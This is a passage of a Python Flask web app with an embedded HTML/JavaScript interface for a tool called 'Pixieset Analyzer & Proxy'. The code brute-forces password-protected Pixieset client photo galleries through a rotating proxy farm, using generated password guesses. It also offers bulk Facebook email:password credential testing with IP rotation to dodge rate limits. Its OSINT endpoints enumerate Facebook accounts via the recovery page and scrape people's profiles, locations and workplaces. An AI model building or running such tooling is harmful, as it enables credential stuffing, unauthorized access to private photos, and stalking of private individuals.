        entries = _load_fb_accounts()
        if 0 <= idx < len(entries):
            del entries[idx]
            _save_fb_accounts(entries)
            return jsonify({"ok": True, "count": len(entries)})
        return jsonify({"error": "index out of range"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 400


_OSINT_HISTORY_FILE = BASE_DIR / "osint_history.json"

def _load_osint_history() -> list:
    try:
        return json.loads(_OSINT_HISTORY_FILE.read_text()) if _OSINT_HISTORY_FILE.exists() else []
    except Exception:
        return []

def _save_osint_history(entries: list):
    try:
        _OSINT_HISTORY_FILE.write_text(json.dumps(entries[-200:], indent=2))
    except Exception:
        pass

def _osint_record(query: str, qtype: str, result: dict):
    entries = _load_osint_history()
    entries.insert(0, {
        "query": query, "type": qtype, "result": result,
        "searched_at": datetime.utcnow().isoformat() + "Z",
    })
    _save_osint_history(entries)


@app.route("/osint/lookup-email", methods=["POST"])
def osint_lookup_email():
    """Check if an email/phone is linked to a Facebook account via recovery page."""
    data = request.get_json() or {}
    email = (data.get("email") or data.get("query") or "").strip()
    if not email:
        return jsonify({"error": "Email or phone required"}), 400

    sess = cffi_requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/110.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
    })

    results = {"query": email, "type": "email_lookup", "findings": []}

    try:
        resp = sess.get(
            "https://mbasic.facebook.com/login/identify/?ctx=recover",
            impersonate=IMPERSONATE, timeout=TIMEOUT, allow_redirects=True,
        )
        body = (resp.text or "")[:8000]

        if 'name="email"' in body or 'name="friend_name"' in body:
            resp2 = sess.post(
                "https://mbasic.facebook.com/login/identify/?ctx=recover",
                data={"email": email},
                impersonate=IMPERSONATE, timeout=TIMEOUT, allow_redirects=True,
            )
            body2 = (resp2.text or "")[:8000]
            final_url = resp2.url or ""

            if "confirm" in body2.lower() and ("account" in body2.lower() or "reset" in body2.lower()):
                results["findings"].append({
                    "source": "recovery",
                    "status": "account_found",
                    "detail": "Facebook account exists for this email/phone",
                    "response_snippet": body2[:400],
                })
            elif "no search results" in body2.lower() or "couldn't find" in body2.lower() or "not match" in body2.lower():
                results["findings"].append({
                    "source": "recovery",
                    "status": "not_found",
                    "detail": "No Facebook account found for this email/phone",
                })
            else:
                results["findings"].append({
                    "source": "recovery",
                    "status": "unclear",
                    "detail": f"Ambiguous response",
                    "response_snippet": body2[:300],
                })
        else:
            results["findings"].append({
                "source": "recovery",
                "status": "blocked",
                "detail": "Could not access recovery page",
            })
    except Exception as e:
        results["findings"].append({"source": "recovery", "status": "error", "detail": str(e)[:200]})

    _osint_record(email, "email_lookup", results)
    return jsonify(results)


@app.route("/osint/profile", methods=["POST"])
def osint_profile():
    """Fetch public Facebook profile info by username or numeric ID."""
    data = request.get_json() or {}
    username = (data.get("username") or data.get("id") or data.get("query") or "").strip()
    if not username:
        return jsonify({"error": "Username or numeric profile ID required"}), 400

    for prefix in ("https://www.facebook.com/", "https://facebook.com/", "http://facebook.com/"):
        if username.startswith(prefix):
            username = username[len(prefix):]
            break
    username = username.split("/")[0].split("?")[0].split("#")[0]

    sess = cffi_requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/110.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })

    results = {"query": username, "type": "profile_lookup", "findings": [], "profile_data": {}}

    try:
        resp = sess.get(
            f"https://mbasic.facebook.com/{username}",
            impersonate=IMPERSONATE, timeout=TIMEOUT, allow_redirects=True,
        )
        body = (resp.text or "")[:10000]
        final_url = resp.url or ""

        if resp.status_code == 404 or "not found" in body.lower():
            results["findings"].append({"source": "mbasic", "status": "not_found", "detail": "Profile not found"})
        elif "login" in final_url and "login.php" in final_url:
            results["findings"].append({"source": "mbasic", "status": "private", "detail": "Profile requires login"})
        else:
            import re
            profile = {}
            title_m = re.search(r'<title>(.*?)</title>', body, re.I)
            if title_m:
                profile["page_title"] = title_m.group(1).strip()

            pid = username if username.isdigit() else None
            if not username.isdigit():
                id_m = re.search(r'"userID"\s*:\s*"?(\d+)"?', body)
                if id_m:
                    pid = id_m.group(1)
                else:
                    id_m2 = re.search(r'entity_id["\']?\s*[:=]\s*["\']?(\d+)', body)
                    if id_m2:
                        pid = id_m2.group(1)

            if pid:
                profile["user_id"] = pid
                profile["profile_picture"] = f"https://graph.facebook.com/{pid}/picture?type=large"

            bio_m = re.search(r'<div[^>]*class="[^"]*bio[^"]*"[^>]*>(.*?)</div>', body, re.I | re.S)
            if bio_m:
                profile["bio"] = re.sub(r'<[^>]+>', '', bio_m.group(1)).strip()[:500]

            loc_m = re.search(r'lives in.*?<a[^>]*>(.*?)</a>', body, re.I)
            if loc_m:
                profile["location"] = loc_m.group(1).strip()

            works = re.findall(r'works at.*?<a[^>]*>(.*?)</a>', body, re.I)
            if works:
                profile["work"] = list(set(works))

            results["profile_data"] = profile
            results["findings"].append({
                "source": "mbasic",
                "status": "success" if profile else "limited",
                "detail": "Profile found" if profile else "Accessible but limited data",
                "profile_url": f"https://facebook.com/{username}",
            })
    except Exception as e:
        results["findings"].append({"source": "mbasic", "status": "error", "detail": str(e)[:200]})

    _osint_record(username, "profile", results)
    return jsonify(results)


@app.route("/osint/search-name", methods=["POST"])
def osint_search_name():
    """Search Facebook for people by name."""
    data = request.get_json() or {}
    name = (data.get("name") or data.get("query") or "").strip()
    if not name:
        return jsonify({"error": "Name required"}), 400

    sess = cffi_requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/110.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    })

    results = {"query": name, "type": "name_search", "profiles": []}

    try:
        import urllib.parse
        q = urllib.parse.quote(name)
        resp = sess.get(
            f"https://mbasic.facebook.com/search/people/?q={q}",
            impersonate=IMPERSONATE, timeout=TIMEOUT, allow_redirects=True,
        )
        body = (resp.text or "")[:15000]

        if "login" in (resp.url or ""):
            results["error"] = "Facebook requires login for name search"
        else:
            import re
            links = re.findall(r'href="/([^"]+?)\?[^"]*"[^>]*>(.*?)</a>', body, re.I | re.S)
            seen = set()
            for href, label in links:
                href = href.strip()
                if href in seen or "php" in href or not href:
                    continue
                seen.add(href)
                clean_label = re.sub(r'<[^>]+>', '', label).strip()
                if not clean_label or len(clean_label) < 2:
                    continue
                results["profiles"].append({
                    "username": href.split("?")[0],
                    "url": f"https://facebook.com/{href.split('?')[0]}",
                    "name": clean_label[:100],
                })
            if not results["profiles"]:
                results["note"] = "No public profiles found"
    except Exception as e:
        results["error"] = str(e)[:200]

    _osint_record(name, "name_search", results)
    return jsonify(results)


@app.route("/osint/avatar", methods=["POST"])
def osint_avatar():
    """Get profile picture URL(s) from numeric Facebook user ID."""
    data = request.get_json() or {}
    uid = (data.get("id") or data.get("uid") or "").strip()
    if not uid or not uid.isdigit():
        return jsonify({"error": "Numeric user ID required"}), 400

    results = {
        "user_id": uid,
        "profile_picture": f"https://graph.facebook.com/{uid}/picture?type=large",
        "profile_picture_small": f"https://graph.facebook.com/{uid}/picture?type=small",
        "profile_picture_normal": f"https://graph.facebook.com/{uid}/picture?type=normal",
        "profile_picture_square": f"https://graph.facebook.com/{uid}/picture?type=square",
    }
    try:
        resp = cffi_requests.get(
            results["profile_picture"],
            impersonate=IMPERSONATE, timeout=10, allow_redirects=False,
        )
        results["status"] = resp.status_code
        results["redirect_url"] = resp.headers.get("Location", "")
    except Exception as e:
        results["status"] = "error"
        results["error"] = str(e)[:100]

    _osint_record(uid, "avatar", results)
    return jsonify(results)


@app.route("/osint/history", methods=["GET"])
def osint_history():
    return jsonify({"history": _load_osint_history(), "count": len(_load_osint_history())})

@app.route("/osint/clear", methods=["DELETE"])
def osint_clear():
    _save_osint_history([])
    return jsonify({"ok": True, "count": 0})

# ---------------------------------------------------------------------------
# HTML Template
# ---------------------------------------------------------------------------
INDEX_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pixieset Analyzer &amp; Proxy</title>
<style>
:root {
  --bg: #0d1117; --surface: #161b22; --border: #30363d;
  --text: #c9d1d9; --text2: #8b949e; --accent: #58a6ff;
  --green: #3fb950; --red: #f85149; --yellow: #d2991d;
  --orange: #db6d28; --purple: #a371f7;
  --critical: #da3633; --high: #f85149; --medium: #d2991d; --low: #58a6ff;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       background: var(--bg); color: var(--text); line-height: 1.6; }
.container { max-width: 1400px; margin: 0 auto; padding: 20px; }
h1 { font-size: 1.6em; color: var(--accent); margin-bottom: 5px; }
h2 { font-size: 1.15em; margin: 15px 0 8px; color: var(--text); }
.subtitle { color: var(--text2); font-size: 0.85em; margin-bottom: 15px; }

/* Tabs */
.tabs { display: flex; gap: 4px; margin: 20px 0 0; border-bottom: 2px solid var(--border); }
.tab { padding: 10px 20px; cursor: pointer; background: transparent;
       border: none; color: var(--text2); font-size: 0.95em; font-weight: 600;
       border-bottom: 2px solid transparent; margin-bottom: -2px; transition: .2s; }
.tab:hover { color: var(--text); }
.tab.active { color: var(--accent); border-bottom-color: var(--accent); }
.tab-panel { display: none; padding: 15px 0; }
.tab-panel.active { display: block; }

/* Input */
input, textarea, select { width: 100%; padding: 10px 14px; background: var(--surface);
  border: 1px solid var(--border); color: var(--text); border-radius: 6px;
  font-size: 0.92em; font-family: 'SF Mono', 'Consolas', monospace; }
input:focus, textarea:focus { outline: none; border-color: var(--accent); }
textarea { resize: vertical; min-height: 80px; }
.btn { padding: 10px 24px; border: none; border-radius: 6px; cursor: pointer;
       font-size: 0.92em; font-weight: 600; transition: .15s; }
.btn-primary { background: var(--accent); color: #000; }
.btn-primary:hover { opacity: 0.85; }
.btn-green { background: var(--green); color: #000; }
.btn-red { background: var(--red); color: #fff; }
.btn-sm { padding: 6px 14px; font-size: 0.8em; }
.row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
.row > * { flex: 1; min-width: 150px; }
.mt10 { margin-top: 10px; }
.mt20 { margin-top: 20px; }
.mb10 { margin-bottom: 10px; }

/* Cards / Results */
.card { background: var(--surface); border: 1px solid var(--border);
        border-radius: 8px; padding: 16px; margin: 10px 0; }
.card-header { font-weight: 600; font-size: 0.95em; margin-bottom: 8px; display: flex;
               justify-content: space-between; align-items: center; }
.badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.75em;
         font-weight: 700; }
.badge-critical{background:var(--critical);color:#fff}.badge-high{background:var(--high);color:#fff}
.badge-medium{background:var(--medium);color:#000}.badge-low{background:var(--low);color:#000}
.badge-info{background:var(--purple);color:#fff}

.finding { padding: 8px 12px; margin: 4px 0; border-radius: 5px;
           font-size: 0.88em; border-left: 3px solid var(--border); }
.finding-critical { border-left-color: var(--critical); background: rgba(218,54,51,0.1); }
.finding-high { border-left-color: var(--high); background: rgba(248,81,73,0.08); }
.finding-medium { border-left-color: var(--medium); background: rgba(210,153,29,0.08); }
.finding-low { border-left-color: var(--low); background: rgba(88,166,255,0.06); }

pre { background: #0d1117; padding: 12px; border-radius: 6px; font-size: 0.82em;
      overflow-x: auto; max-height: 400px; border: 1px solid var(--border);
      white-space: pre-wrap; word-break: break-all; }
code { font-family: 'SF Mono', 'Consolas', monospace; font-size: 0.88em; }
.status-ok { color: var(--green); }
.status-fail { color: var(--red); }

table { width: 100%; border-collapse: collapse; font-size: 0.88em; }
th, td { padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--border); }
th { color: var(--text2); font-weight: 600; }
tr:hover td { background: rgba(88,166,255,0.04); }

.loading { display: none; text-align: center; padding: 20px; color: var(--text2); }
.loading.visible { display: block; }
.spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid var(--border);
           border-top-color: var(--accent); border-radius: 50%; animation: spin .6s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }

.stat { text-align: center; padding: 12px; }
.stat-value { font-size: 2em; font-weight: 700; }
.stat-label { font-size: 0.8em; color: var(--text2); }
.stats { display: flex; gap: 12px; flex-wrap: wrap; }

/* Split panel */
.split { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
@media (max-width: 900px) { .split { grid-template-columns: 1fr; } }
</style>
</head>
<body>
<div class="container">
  <h1>🔍 Pixieset Analyzer &amp; Proxy</h1>
  <p class="subtitle">Source-code analysis · Password discovery · Burp-style proxy · Multi-IP farm brute</p>

  <!-- Tabs -->
  <div class="tabs">
    <button class="tab active" onclick="switchTab('analyzer')">📊 Analyzer</button>
    <button class="tab" onclick="switchTab('proxy')">🔁 Proxy / Repeater</button>
    <button class="tab" onclick="switchTab('tester')">🔑 Password Tester</button>
    <button class="tab" onclick="switchTab('farm')">🌾 Farm Brute Force</button>
    <button class="tab" onclick="switchTab('found')">🔓 Found Passwords</button>
    <button class="tab" onclick="switchTab('osint')">📡 OSINT</button>
    <button class="tab" onclick="switchTab('facebook')">📘 Facebook</button>
    <button class="tab" onclick="switchTab('jsview')">📜 JS Inspector</button>
  </div>

  <!-- ========= ANALYZER TAB ========= -->
  <div id="tab-analyzer" class="tab-panel active">
    <div class="row">
      <input type="text" id="analyze-url" style="flex:3"
             placeholder="Pixieset URL (e.g. https://subdomain.pixieset.com/jill/)">
      <button class="btn btn-primary" onclick="doAnalyze()" style="flex:0 0 auto">Analyze Source</button>
    </div>
    <div id="analyze-loading" class="loading"><span class="spinner"></span> Fetching &amp; analyzing source code...</div>
    <div id="analyze-results"></div>
  </div>

  <!-- ========= PROXY TAB ========= -->
  <div id="tab-proxy" class="tab-panel">
    <p class="subtitle">Send manual HTTP requests like Burp Repeater — bypasses Cloudflare via Chrome 110 impersonation.</p>
    <div class="row mb10">
      <select id="proxy-method" style="flex:0 0 auto; width:100px">
        <option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>HEAD</option>
      </select>
      <input type="text" id="proxy-url" style="flex:3" placeholder="Full URL (e.g. https://sub.pixieset.com/guestlogin/jill/)">
      <button class="btn btn-primary" onclick="doProxySend()" style="flex:0 0 auto">Send</button>
    </div>
    <div class="split">
      <div>
        <h2>Request</h2>
        <label class="subtitle">Custom Headers (one per line, e.g. Content-Type: text/html)</label>
        <textarea id="proxy-headers" rows="3" placeholder="X-Custom: value&#10;Referer: https://..."></textarea>
        <label class="subtitle mt10">Request Body (for POST/PUT)</label>
        <textarea id="proxy-body" rows="4" placeholder="CollectionGuestLoginForm[password]=test"></textarea>
      </div>
      <div>
        <h2>Response</h2>
        <div id="proxy-response">
          <p class="subtitle">Send a request to see the response here.</p>
        </div>
      </div>
    </div>
    <div class="mt20">
      <div style="display:flex; justify-content:space-between; align-items:center">
        <h2>History</h2>
        <button class="btn btn-red btn-sm" onclick="doClearHistory()">Clear</button>
      </div>
      <div id="proxy-history"></div>
    </div>
  </div>

  <!-- ========= PASSWORD TESTER TAB ========= -->
  <div id="tab-tester" class="tab-panel">
    <p class="subtitle">Manually test a password against a Pixieset gallery login.</p>
    <div class="row mb10">
      <input type="text" id="test-base" placeholder="Pixieset base URL (e.g. subdomain.pixieset.com)" style="flex:2">
      <input type="text" id="test-slug" placeholder="Gallery slug (e.g. jill)" style="flex:1">
      <input type="text" id="test-password" placeholder="Password to try" style="flex:1">
      <button class="btn btn-primary" onclick="doTestPassword()" style="flex:0 0 auto">Test</button>
    </div>
    <div id="test-result"></div>
  </div>

  <!-- ========= FARM BRUTE FORCE TAB ========= -->
  <div id="tab-farm" class="tab-panel">
    <p class="subtitle">Paste gallery links — jobs run in the background through the Vultr proxy farm (3 attempts/IP batching).</p>

    <div class="card mb10">
      <div class="card-header">Gallery URLs <span id="farm-proxy-badge" class="subtitle" style="font-weight:400;margin-left:8px"></span></div>
      <textarea id="farm-urls" rows="4" placeholder="One per line, e.g.&#10;https://sarahhillphotography15.pixieset.com/jill/&#10;https://other.pixieset.com/wedding/"></textarea>

      <div class="row mt10 mb10" style="align-items:flex-start">
        <div style="flex:1">
          <label class="subtitle">Extra words (names, dates — feeds smart generator)</label>
          <textarea id="farm-extra" rows="3" placeholder="Sarah&#10;Hill&#10;2015&#10;wedding"></textarea>
        </div>
        <div style="flex:1">
          <label class="subtitle">Custom passwords / wordlist (optional)</label>
          <textarea id="farm-wordlist" rows="3" placeholder="password1&#10;Summer2024!&#10;jill123"></textarea>
        </div>
      </div>

      <div class="row mb10" style="flex-wrap:wrap;gap:12px;align-items:center">
        <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
          <input type="checkbox" id="farm-auto" checked> Smart password generation
        </label>
        <label style="display:flex;align-items:center;gap:6px;cursor:pointer">
          <input type="checkbox" id="farm-proxy" checked> Use proxy farm
        </label>
        <label style="display:flex;align-items:center;gap:6px">
          Delay (s)
          <input type="number" id="farm-delay" value="2" min="0.5" step="0.5" style="width:70px">
        </label>
        <button class="btn btn-primary" onclick="doFarmStart()" id="farm-start-btn">Start Brute Force</button>
        <button class="btn btn-sm" onclick="loadFarmJobs()">Refresh Jobs</button>
      </div>
    </div>

    <div id="farm-start-msg"></div>

    <div class="split">
      <div>
        <h2>Jobs</h2>
        <div id="farm-jobs"><p class="subtitle">No jobs yet — paste URLs and start.</p></div>
      </div>
      <div>
        <h2>Job Detail / Log</h2>
        <div id="farm-detail"><p class="subtitle">Select a job to watch live progress.</p></div>
      </div>
    </div>
  </div>

  <!-- ========= OSINT TAB ========= -->
  <div id="tab-osint" class="tab-panel">
    <p class="subtitle">Facebook intelligence gathering — email lookup, profile scraping, name search, avatar retrieval.</p>

    <div class="split">
      <div>
        <div class="card mb10">
          <div class="card-header">Email / Phone Lookup</div>
          <p class="subtitle" style="margin:4px 0 8px">Checks if an email or phone is linked to a Facebook account via the account recovery page.</p>
          <div class="row">
            <input type="text" id="osint-email" placeholder="email@example.com or +15551234567" style="flex:2">
            <button class="btn btn-primary btn-sm" onclick="doOSINTLookup('email')" style="flex:0 0 auto">Lookup</button>
          </div>
          <div id="osint-email-result" style="margin-top:8px"></div>
        </div>

        <div class="card mb10">
          <div class="card-header">Profile Lookup</div>
          <p class="subtitle" style="margin:4px 0 8px">Pull public profile info by username or numeric Facebook ID.</p>
          <div class="row">
            <input type="text" id="osint-profile" placeholder="username or facebook.com/username" style="flex:2">
            <button class="btn btn-primary btn-sm" onclick="doOSINTLookup('profile')" style="flex:0 0 auto">Lookup</button>
          </div>
          <div id="osint-profile-result" style="margin-top:8px"></div>
        </div>

        <div class="card mb10">
          <div class="card-header">Avatar / Profile Picture</div>
          <p class="subtitle" style="margin:4px 0 8px">Retrieve profile pictures from a numeric Facebook user ID via Graph API.</p>
          <div class="row">
            <input type="text" id="osint-avatar-id" placeholder="Numeric user ID (e.g. 100000123456789)" style="flex:2">
            <button class="btn btn-primary btn-sm" onclick="doOSINTLookup('avatar')" style="flex:0 0 auto">Get Avatar</button>
          </div>
          <div id="osint-avatar-result" style="margin-top:8px"></div>
        </div>
      </div>

      <div>
        <div class="card mb10">
          <div class="card-header">Search by Name</div>
          <p class="subtitle" style="margin:4px 0 8px">Search Facebook people directory by full name.</p>
          <div class="row">
            <input type="text" id="osint-name" placeholder="Full name (e.g. Sarah Hill)" style="flex:2">
            <button class="btn btn-primary btn-sm" onclick="doOSINTLookup('name')" style="flex:0 0 auto">Search</button>
          </div>
          <div id="osint-name-result" style="margin-top:8px"></div>
        </div>

        <div class="mt10">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <h2>Lookup History</h2>
            <button class="btn btn-red btn-sm" onclick="doOSINTClear()">Clear</button>
          </div>
          <div id="osint-history"><p class="subtitle">No lookups yet.</p></div>
        </div>
      </div>
    </div>
  </div>

  <!-- ========= FACEBOOK TAB ========= -->
  <div id="tab-facebook" class="tab-panel">
    <p class="subtitle">Test Facebook credentials — uses mobile login endpoint with Chrome impersonation via the proxy farm.</p>

    <div class="card mb10">
      <div class="card-header">Credential Tester</div>
      <div class="row mb10">
        <input type="text" id="fb-email" placeholder="Email or phone number" style="flex:2">
        <input type="password" id="fb-password" placeholder="Password" style="flex:1">
        <button class="btn btn-primary" onclick="doFBTest()" id="fb-test-btn">Test Login</button>
      </div>
      <div class="row" style="align-items:center">
        <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:0.85em">
          <input type="checkbox" id="fb-proxy" checked> Route through proxy farm (rotates IPs)
        </label>
        <span id="fb-proxy-status" style="font-size:0.8em;color:var(--text2)"></span>
      </div>
      <div class="row mb10 mt10">
        <textarea id="fb-bulk" rows="4" placeholder="Bulk test — one per line:&#10;email1@example.com:password1&#10;email2@example.com:password2" style="flex:1"></textarea>
        <button class="btn btn-sm" onclick="doFBBulk()" style="flex:0 0 auto;align-self:flex-end">Test All</button>
      </div>
      <div id="fb-result"></div>
    </div>

    <div class="mt20">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <h2>Tested Accounts</h2>
        <button class="btn btn-red btn-sm" onclick="doFBClear()">Clear All</button>
      </div>
      <div id="fb-accounts-list">
        <p class="subtitle">No accounts tested yet. Enter credentials above and click Test Login.</p>
      </div>
    </div>
  </div>

  <!-- ========= FOUND PASSWORDS TAB ========= -->
  <div id="tab-found" class="tab-panel">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
      <p class="subtitle" style="margin:0">All cracked gallery passwords — auto-recorded from Farm jobs & Password Tester.</p>
      <button class="btn btn-red btn-sm" onclick="doClearFound()">Clear All</button>
    </div>
    <div id="found-list"><p class="subtitle">Nothing cracked yet. Run Farm Brute Force or Password Tester to populate.</p></div>
    <div class="mt20" id="found-add-form" style="display:none">
      <h2>Add Manually</h2>
      <div class="row mb10" style="gap:8px">
        <input id="found-host" placeholder="host (e.g. sarahhillphotography15.pixieset.com)" style="flex:2">
        <input id="found-slug" placeholder="slug (e.g. jill)" style="flex:1">
        <input id="found-pass" placeholder="password" style="flex:1">
        <button class="btn btn-sm" onclick="doAddFound()">Add</button>
      </div>
    </div>
  </div>

  <!-- ========= JS INSPECTOR TAB ========= -->
  <div id="tab-jsview" class="tab-panel">
    <p class="subtitle">Fetch and inspect external JavaScript files for hardcoded passwords, API keys, and secrets.</p>
    <div class="row mb10">
      <input type="text" id="js-url" style="flex:3" placeholder="JavaScript file URL (e.g. https://cdn.pixieset.com/app.js)">
      <button class="btn btn-primary" onclick="doFetchJS()" style="flex:0 0 auto">Fetch &amp; Inspect</button>
    </div>
    <div id="js-result"></div>
  </div>
</div>

<script>
function $(id) { return document.getElementById(id); }

function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  event.target.classList.add('active');
  $('tab-' + name).classList.add('active');
}

function findingHTML(f) {
  let sev = f.severity || 'low';
  return `<div class="finding finding-${sev}">
    <strong>[${(sev||'info').toUpperCase()}]</strong> ${f.type}
    ${f.detail ? '<br><code>' + esc(f.detail) + '</code>' : ''}
  </div>`;
}

function esc(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function showLoading(id) { $(id).classList.add('visible'); }
function hideLoading(id) { $(id).classList.remove('visible'); }

// ---- ANALYZER ----
async function doAnalyze() {
  const url = $('analyze-url').value.trim();
  if(!url) return;
  showLoading('analyze-loading');
  $('analyze-results').innerHTML = '';
  try {
    const r = await fetch('/analyze', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({url})});
    const d = await r.json();
    renderAnalyze(d);
  } catch(e) {
    $('analyze-results').innerHTML = '<div class="card" style="color:var(--red)">Error: '+esc(e.message)+'</div>';
  }
  hideLoading('analyze-loading');
}

function renderAnalyze(d) {
  let html = '';
  // Stats
  html += '<div class="stats mt10">';
  html += statBox('Status', d.status_code||'?', '');
  html += statBox('Size', (d.content_length||0).toLocaleString()+' bytes', '');
  html += statBox('Findings', d.finding_count||0, d.critical_count > 0 ? 'var(--critical)' : 'var(--accent)');
  html += statBox('Critical', d.critical_count||0, 'var(--critical)');
  html += '</div>';

  html += '<div class="card mt10"><div class="card-header">📋 Assessment</div>'+esc(d.assessment||'No data')+'</div>';

  if(d.final_url && d.final_url !== d.url)
    html += '<div class="card"><div class="card-header">↪ Redirect</div>'+esc(d.url)+' → <strong>'+esc(d.final_url)+'</strong></div>';

  // Findings
  if(d.findings && d.findings.length) {
    html += '<div class="card"><div class="card-header">🚩 Findings ('+d.findings.length+')</div>';
    d.findings.forEach(f => { html += findingHTML(f); });
    html += '</div>';
  }

  // Suspicious vars
  if(d.suspicious_vars && d.suspicious_vars.length) {
    html += '<div class="card"><div class="card-header">⚠ Suspicious Variables</div>';
    d.suspicious_vars.forEach(v => {
      html += '<div class="finding finding-critical"><strong>'+esc(v.match)+'</strong> <br><code>'+esc(v.context)+'</code></div>';
    });
    html += '</div>';
  }

  // Forms
  if(d.forms && d.forms.length) {
    html += '<div class="card"><div class="card-header">📝 Forms ('+d.forms.length+')</div>';
    d.forms.forEach(f => {
      html += '<div class="mb10"><strong>'+esc(f.method)+'</strong> '+esc(f.action)+'<br>';
      if(f.fields && f.fields.length) {
        html += '<table><tr><th>Name</th><th>Type</th><th>Value</th></tr>';
        f.fields.forEach(fd => {
          let vc = fd.type==='hidden' ? 'color:var(--yellow)' : '';
          html += '<tr><td>'+esc(fd.name)+'</td><td>'+esc(fd.type)+'</td><td style="'+vc+'"><code>'+esc(fd.value||'')+'</code></td></tr>';
        });
        html += '</table>';
      }
      html += '</div>';
    });
    html += '</div>';
  }

  // Comments
  if(d.comments && d.comments.length) {
    html += '<div class="card"><div class="card-header">💬 HTML Comments ('+d.comments.length+')</div>';
    d.comments.slice(0,20).forEach(c => { html += '<div class="finding finding-low"><code>'+esc(c)+'</code></div>'; });
    if(d.comments.length > 20) html += '<p class="subtitle">... and '+(d.comments.length-20)+' more</p>';
    html += '</div>';
  }

  // API endpoints
  if(d.api_endpoints && d.api_endpoints.length) {
    html += '<div class="card"><div class="card-header">🔗 API Endpoints ('+d.api_endpoints.length+')</div>';
    d.api_endpoints.forEach(url => {
      html += '<div class="finding finding-medium"><code>'+esc(url)+'</code></div>';
    });
    html += '</div>';
  }

  // External JS
  if(d.external_js && d.external_js.length) {
    html += '<div class="card"><div class="card-header">📜 External JavaScript ('+d.external_js.length+')</div>';
    html += '<p class="subtitle">Click any file to inspect it in the JS Inspector tab.</p>';
    d.external_js.forEach(url => {
      html += '<div style="cursor:pointer;color:var(--accent);margin:3px 0" onclick="$(\'js-url\').value=\''+esc(url)+'\';switchTab(\'jsview\');doFetchJS()"><code>'+esc(url)+'</code></div>';
    });
    html += '</div>';
  }

  // Raw source (truncated)
  html += '<div class="card"><div class="card-header">📄 Raw Source (first 50KB)</div>';
  html += '<pre>'+esc((d.raw_source||'').substring(0,50000))+'</pre></div>';

  $('analyze-results').innerHTML = html;
}

function statBox(label, value, color) {
  return '<div class="stat"><div class="stat-value" style="color:'+(color||'var(--accent)')+'">'+value+'</div><div class="stat-label">'+label+'</div></div>';
}

// ---- PROXY ----
async function doProxySend() {
  const body = JSON.stringify({
    method: $('proxy-method').value,
    url: $('proxy-url').value.trim(),
    headers: $('proxy-headers').value,
    body: $('proxy-body').value,
  });
  try {
    const r = await fetch('/proxy-send', {method:'POST', headers:{'Content-Type':'application/json'}, body});
    const d = await r.json();
    renderProxyResponse(d);
    loadHistory();
  } catch(e) {
    $('proxy-response').innerHTML = '<p style="color:var(--red)">Error: '+esc(e.message)+'</p>';
  }
}

function renderProxyResponse(d) {
  if(d.error) {
    $('proxy-response').innerHTML = '<p style="color:var(--red)"><strong>Error:</strong> '+esc(d.error)+'</p>';
    return;
  }
  let html = '<div class="stats mb10">';
  html += statBox('Status', d.status_code||0, d.status_code < 400 ? 'var(--green)' : 'var(--red)');
  html += statBox('Time', (d.elapsed_ms||0)+'ms', '');
  html += statBox('Size', (d.size||0).toLocaleString()+' bytes', '');
  html += '</div>';

  if(d.clues && d.clues.length) {
    html += '<div class="card"><div class="card-header">🔎 Clues</div>';
    d.clues.forEach(c => { html += '<div class="finding finding-high">'+esc(c)+'</div>'; });
    html += '</div>';
  }
  if(d.redirect_location)
    html += '<p><strong>Location:</strong> <code>'+esc(d.redirect_location)+'</code></p>';

  html += '<h2>Response Headers</h2><pre>'+Object.entries(d.response_headers||{}).map(([k,v])=>k+': '+v).join('\n')+'</pre>';
  html += '<h2>Response Body</h2><pre>'+esc((d.response_body||'').substring(0, 20000))+'</pre>';
  $('proxy-response').innerHTML = html;
}

async function loadHistory() {
  try {
    const r = await fetch('/proxy-history');
    const h = await r.json();
    if(!h.length) { $('proxy-history').innerHTML = '<p class="subtitle">No requests yet.</p>'; return; }
    let html = '<table><tr><th>#</th><th>Method</th><th>URL</th><th>Status</th><th>Size</th><th>Time</th></tr>';
    h.reverse().forEach(e => {
      html += '<tr><td>'+e.id+'</td><td>'+esc(e.method)+'</td><td style="max-width:400px;overflow:hidden">'+esc(e.url)+'</td>';
      html += '<td style="color:'+(e.status_code<400?'var(--green)':'var(--red)')+'">'+e.status_code+'</td>';
      html += '<td>'+(e.response_size||0).toLocaleString()+'</td><td>'+e.time+'</td></tr>';
    });
    html += '</table>';
    $('proxy-history').innerHTML = html;
  } catch(e) {}
}

async function doClearHistory() {
  await fetch('/proxy-clear', {method:'POST'});
